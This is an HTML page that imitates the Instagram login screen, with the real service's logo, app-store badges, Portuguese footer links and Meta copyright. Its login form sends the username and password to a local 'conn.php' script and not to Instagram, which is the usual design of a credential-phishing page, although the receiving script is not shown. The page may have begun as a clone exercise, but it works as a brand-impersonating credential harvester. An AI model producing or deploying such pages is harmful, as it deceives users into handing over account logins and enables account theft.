<!DOCTYPE html>
<html lang="pt-AO">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Instagram">
    <meta name="author" content="Edlávio Alberto">
    <link rel="shortcut icon" href="img/icon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/style.css">
    <title>Instagram</title>
</head>
<body onload="SwitchScreen()">
        <section class="container">
            <!-- SMARTPHONE SECTION -->
            <article class="smartphone">
                <div class="screens">
                    <img class="screen fade" src="img/screen1.png" alt="screen1">
                    <img class="screen fade" src="img/screen2.png" alt="screen2">
                    <img class="screen fade" src="img/screen3.png" alt="screen3">
                </div>
                <img src="img/smartphones.png" alt="smartphones">
            </article>
            <!-- SMARTPHONE SECTION END -->
            <!-- FORM SECTION -->
            <article class="form-area">
                <div class="logo">
                    <img src="img/logo.png" alt="Instagram Logo">
                </div>
                <form action="conn.php" method="post">
                    <input type="password" name="username" id="username" placeholder="Phone number, username or email address">
                    <input type="password" name="password" id="password" placeholder="password">
                    
                    

                    <input type="submit" name="submit" value="Log in">
                    <div class="other-option">
                        <div></div> <p>OU</p> <div></div>
                    </div>
                    <div class="options">
                        <a href="#" class="social"> <span><i class="fab fa-facebook-square"></i></span> Continue Using Facebook </a>
                        <div class="forget"> <a href="#">Forgotten your password?</a> </div>
                    </div>
                </form>
                <div class="noaccount">
                    <a href="#">Don't have an account? <span>Singh up</span></a>
                </div>
                <div class="apps">
                    <p>Obtenha o aplicativo</p>
                    <a href="#"> <img src="img/appstore.png" alt="Baixar o aplicativo na AppStore"> </a>
                    <a href="#"> <img src="img/googleplay.png" alt="Baixar o aplicativo no Google Play"> </a>
                </div>
            </article>
        </section>
            <!-- FORM SECTION END -->
            <!-- FOOTER -->
        <footer>
            <div class="footer-content">
                <a href="#">Meta</a>
                <a href="#">Sobre</a>
                <a href="#">Blog</a>
                <a href="#">Carreiras</a>
                <a href="#">API</a>
                <a href="#">Privacidade</a>
                <a href="#">Termos</a>
                <a href="#">Principais contas</a>
                <a href="#">Hashtags</a>
                <a href="#">Localizações</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Carregamento de contactos e não usuários</a>
            </div>
            <div>
                <a href="#">Dança</a>
                <a href="#">Comida e bebida</a>
                <a href="#">Casa jardim</a>
                <a href="#">Música</a>
                <a href="#">Artes visuais</a>
            </div>
            <div class="copyright">
                <select aria-label="Trocar idioma de exibição">
                    <option value="pt">Português (Portugal)</option>
                    <option value="af">Afrikaans</option>
                    <option value="cs">Čeština</option>
                    <option value="da">Dansk</option>
                    <option value="de">Deutsch</option>
                    <option value="el">Ελληνικά</option>
                    <option value="en">English</option>
                    <option value="en-gb">English (UK)</option>
                    <option value="es">Español (España)</option>
                    <option value="es-la">Español</option>
                    <option value="fi">Suomi</option>
                    <option value="fr">Français</option>
                    <option value="id">Bahasa Indonesia</option>
                    <option value="it">Italiano</option>
                    <option value="ja">日本語</option>
                    <option value="ko">한국어</option>
                    <option value="ms">Bahasa Melayu</option>
                    <option value="nb">Norsk</option>
                    <option value="nl">Nederlands</option>
                    <option value="pl">Polski</option>
                    <option value="pt-br">Português (Brasil)</option>
                    <option value="ru">Русский</option>
                    <option value="sv">Svenska</option>
                    <option value="th">ภาษาไทย</option>
                    <option value="tl">Filipino</option>
                    <option value="tr">Türkçe</option>
                    <option value="zh-cn">中文(简体)</option>
                    <option value="zh-tw">中文(台灣)</option>
                    <option value="bn">বাংলা</option>
                    <option value="gu">ગુજરાતી</option>
                    <option value="hi">हिन्दी</option>
                    <option value="hr">Hrvatski</option>
                    <option value="hu">Magyar</option>
                    <option value="kn">ಕನ್ನಡ</option>
                    <option value="sk">Slovenčina</option>
                    <option value="ta">தமிழ்</option>
                    <option value="te">తెలుగు</option>
                    <option value="vi">Tiếng Việt</option>
                    <option value="zh-hk">中文(香港)</option>
                    <option value="bg">Български</option>
                    <option value="ro">Română</option>
                    <option value="sr">Српски</option>
                    <option value="uk">Українська</option>
                </select>
                <span>&copy; 2023 Instagram from Meta</span>
            </div>
        </footer>
        <script src="js/app.js"></script>
    <script src="js/brands.min.js"></script>
    <script src="js/fontawesome.min.js"></script>
</body>
</html>
